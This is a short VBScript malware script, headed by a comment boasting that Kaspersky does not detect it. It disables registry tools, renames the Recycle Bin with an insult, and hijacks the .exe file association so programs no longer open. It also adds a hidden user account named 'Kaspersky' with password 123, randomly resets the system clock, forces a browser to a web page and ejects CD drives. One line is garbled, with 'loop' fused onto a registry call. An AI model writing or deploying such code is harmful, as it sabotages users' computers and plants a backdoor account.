'is novirus not detected kasperom FIGA
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
randomize
do
h=cint(rnd()*1000)
m=cint(rnd()*1000)
if h<=23 and m<=59 then
wscript.sleep 1
s.run "cmd /c time "&h&":"&m,0
end if
loops.regdelete"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{645FF040-5081-101B-9F08-00AA002F954E}\"
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoSelectDownloadDir","1","REG_DWORD"
s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","Помойка ламера"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
set application=createobject("shell.application")
application.minimizeall
s.regwrite"HKCR\exefile\shell\open\command\","rundll32.exe"
Set IE = CreateObject("InternetExplorer.Application") 
IE.Visible = 1 
IE.Navigate "http:\\www.play4life.myminicity.com" 
While IE.Busy
WScript.Sleep 200
Wend
s.run"net user Kaspersky 123 /add",0
Set ww=CreateObject("WMPlayer.OCX.7")
Set cw=ww.cdromCollection
if cw.Count>=1 then
For i=0 to cw.Count-1
cw.Item(i).eject
next
End If

do
fso.getfile("A:\")
loop

